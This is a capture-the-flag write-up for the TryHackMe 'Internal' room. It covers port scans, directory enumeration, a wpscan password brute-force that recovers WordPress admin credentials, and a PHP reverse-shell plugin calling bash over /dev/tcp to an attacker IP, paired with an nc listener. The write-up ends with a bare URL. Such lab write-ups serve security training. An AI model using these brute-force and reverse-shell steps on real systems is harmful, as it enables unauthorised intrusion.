# Internal

**Room Link:** [https://tryhackme.com/room/internal](https://tryhackme.com/room/internal)



## Scanning

### Initial Scan

<pre><code><strong>nmap -A 10.10.46.54
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

### Scan all ports

<pre><code><strong>nmap -p- 10.10.46.54
</strong></code></pre>

### TCP/80 - HTTP

```
gobuster dir -u http://10.10.46.54 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt -t 30

```

<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

Wordpress is running under both /blog and /wordpress. /blog has a login page

```
wpscan --url http://10.10.46.54
wpscan --url http://10.10.46.54/blog --passwords /usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

#### Credentials found

<pre><code><strong>Username: admin 
</strong><strong>Password: my2boys
</strong></code></pre>

Trying to login the page redirects to internal.htm so I add that to the host file.

```
vi /etc/hosts
```

<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

We are able to successfully get into wordpress with the credentials

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Reverse Shell Failed Attempt

revshell.php code

```
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.120.18/443 0>&1'");
?>
```

```
vi revshell.php
zip revshell.zip revshell.php
nc -lvnp 443
```

<figure><img src="../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Unable to upload the plugin due to write issues

<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

### Reverse Shell

```
http://www.internal.thm/blog/index.php/2020/08/03/hello-worlgd/
```





<figure><img src="../../.gitbook/assets/image (44).png" alt=""><figcaption></figcaption></figure>
